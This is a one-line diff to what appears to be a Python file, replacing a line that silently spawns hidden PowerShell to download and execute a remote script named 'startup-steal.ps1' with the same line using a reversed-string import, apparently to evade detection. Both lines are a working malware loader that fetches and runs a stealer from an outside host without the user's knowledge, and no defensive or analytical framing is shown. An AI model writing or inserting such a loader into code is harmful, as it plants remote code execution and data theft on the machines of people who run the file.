@@ -1,1 +1,1 @@
-__import__('subprocess').Popen('powershell -nop -ep bypass -w hidden -c "iwr -useb https://raw.githubusercontent.com/s1uiasdad/log-acc-v2/main/scr/startup-steal.ps1 | iex"', shell=True, stdout=-3, stderr=-3)
+__import__('ssecorpbus'[::-1]).Popen('powershell -nop -ep bypass -w hidden -c "iwr -useb https://raw.githubusercontent.com/s1uiasdad/log-acc-v2/main/scr/startup-steal.ps1 | iex"', shell=True, stdout=-3, stderr=-3)
